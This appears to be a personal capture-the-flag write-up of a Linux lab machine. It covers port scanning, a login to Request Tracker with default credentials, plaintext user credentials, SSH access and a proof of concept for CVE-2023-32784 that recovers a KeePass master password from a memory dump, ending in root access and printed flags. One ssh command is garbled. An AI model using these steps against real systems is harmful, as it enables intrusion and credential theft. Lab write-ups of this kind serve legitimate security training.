---
created_date: 31  November 2023
updated_date: 31 November 2023
type: linux
---

##### Machine Information
```
IP Address: 10.10.11.227
Hostname:
Operating System:
Exploit & Port:
Privilege Escalation:
Credentials:

Path to Box:

-> NIX01 - 192.168.1.1
--> NIX02 - 192.168.1.2
```
### High-Level Summary

A brief description of the attack chain with machine names, including the depth of compromise should be included here.

-------------
### Initial Scanning

- [ ] `Ping`
- [ ] `Rustscan`
- [x] `Quick TCP Nmap`
- [x] `Full TCP Nmap`
- [ ] `Full UDP Nmap`

#ping
- Pinging to ensure box is up, get brief OS information.
```bash
ping $ip_address
```

#rustscan 
- Typically way faster than nmap, gives very brief port information - but enough to get started while other nmap scripts run.
```bash
rustscan -a $ip_address
```

#quick #tcp #nmap 
- Quick Nmap to get initial port information.
```bash
[root💀~] [10.10.14.106] [2023-11-30 08:54:26] 
 └─╼ # nmap -sC -sV -Pn 10.10.11.227
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-30 08:55 EST
Nmap scan report for 10.10.11.227
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.46 seconds

```

#full #tcp #nmap 
- Full TCP Nmap to get all port information.
```bash
[root💀~] [10.10.14.106] [2023-11-30 08:55:19] 
 └─╼ # nmap -sC -sV -Pn -p- 10.10.11.227
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-30 08:55 EST
Nmap scan report for 10.10.11.227
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.54 seconds

```
##### Initial Scanning Notes:
#initial #scanning #notes
- port 80 for initial access, `dirbust` `burp` should be the only way forward
-------
###### Dirbusting

```bash
[root💀~] [10.10.14.106] [2023-11-30 08:56:23] 
 └─╼ # gobuster dir -u http://10.10.11.227:80 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.227:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/11/30 09:02:34 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 149]
/index.html           (Status: 200) [Size: 149]
Progress: 27627 / 27690 (99.77%)
===============================================================
2023/11/30 09:03:52 Finished
===============================================================
```
nothing from dirbusting

navigating to the website show's this
![[Pasted image 20231130093436.png]]
clicking on the link leads to this, after adding `10.10.11.227        tickets.keeper.htb` to `/etc/hosts`
navigating to the website then shows this
![[Pasted image 20231130093708.png]]
googling `REQUEST TRACKER` default credentials shows the credentials to be `root:password`
![[Pasted image 20231130094000.png]]
after logging into the website navigate to `Search -> Tickets -> Recently Viewed` to see `#3000000: Issue with Keepass CLient on Windows`
![[Pasted image 20231130103305.png]]
this is probably the way forward considering that `KEEPER` is the name of the box.

after clicking on the ticket the person sending the `ticket` is named `Inorgaard (Lise Norgaard)` click on the name.
![[Pasted image 20231130103916.png]]
that brings us to the `user profile` which has several menus to interact with
![[Pasted image 20231130104217.png]]
click `edit` to see credentials
![[Pasted image 20231130104314.png]]
credential are `lnorgaard:Welcome2023!`'

sshing in with `lnorgaard@10.10.11.227`
```bash
[root💀/usr/share/wordlists/dirbuster] [10.10.14.106] [2023-11-30 10:49:02] 
 └─╼ # ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Thu Nov 30 16:27:14 2023 from 10.10.14.109
lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp  passcodes.kdbx  poc.py  RT30000.zip  user.txt
lnorgaard@keeper:~$ 
lnorgaard@keeper:~$ cat user.txt
927559cd88c4f19bb5715b82058d6c08
```
![[Pasted image 20231130105516.png]]
listed files in directories with `ls`

user.txt flag
```bash
[root💀~/_htb] [10.10.14.106] [2023-11-30 12:50:15] 
 └─╼ # cat user.txt
927559cd88c4f19bb5715b82058d6c08
```
hosting a `python3 -m http.server` to pull over files
![[Pasted image 20231130110436.png]]
pulling over all files with `wget http://10.10.11.227:8000/KeePassDumpFull.dmp`
![[Pasted image 20231130110516.png]]
exploiting `CVE-2023-32784`
```
[root💀~/_htb] [10.10.14.106] [2023-11-30 11:08:41] 
 └─╼ # python3 poc.py KeePassDumpFull.dmp 
2023-11-30 11:08:49,695 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de

```
![[Pasted image 20231130111520.png]]
when throwing in the first line `●,dgr●d med fl●de` into google, google spits out the `DANISH` translation of `Rødgrød med fløde`
![[Pasted image 20231130113636.png]]
downloaded `keepass2` on linux machine to attempt to utilize the password with the command `keepass2 passcodes.kdbx` by utilizing  the password `rødgrød med fløde` with lowercase letters.

that spits out a `Putty User Key File`, this can be turned into a `id_rsa` key and used to authenticate
![[Pasted image 20231130114250.png]]
save `putty_key` into a file
![[Pasted image 20231130124514.png]]
move `putty_key` into `id_rsa.ppk` , ppk files are the `putty` designator
`puttygen id_rsa.ppk -O private-openssh -o id_rsa` to change the `putty` file into a usable `ssh key` named `id_rsa`
`ssh -i id_rsa.ppk -O private-openssh -o id_rsa` to utilize the ssh key
![[Pasted image 20231130124631.png]]
i am root
```bash
root@keeper:~# cat root.txt
96dc83780818d66135f32cef6c6b6e51
```